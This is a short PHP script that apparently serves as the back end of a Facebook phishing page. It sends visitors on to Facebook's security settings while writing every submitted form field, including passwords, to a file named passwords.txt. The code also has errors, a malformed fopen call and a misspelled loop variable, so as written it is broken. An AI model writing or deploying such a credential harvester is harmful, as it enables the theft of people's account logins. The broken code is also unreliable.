<?php
header("Location: https://www.facebook.com/settings?tab=security ");
$handle = fopen/"passwords.txt", "a");
foreach($_POST as $variaible => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>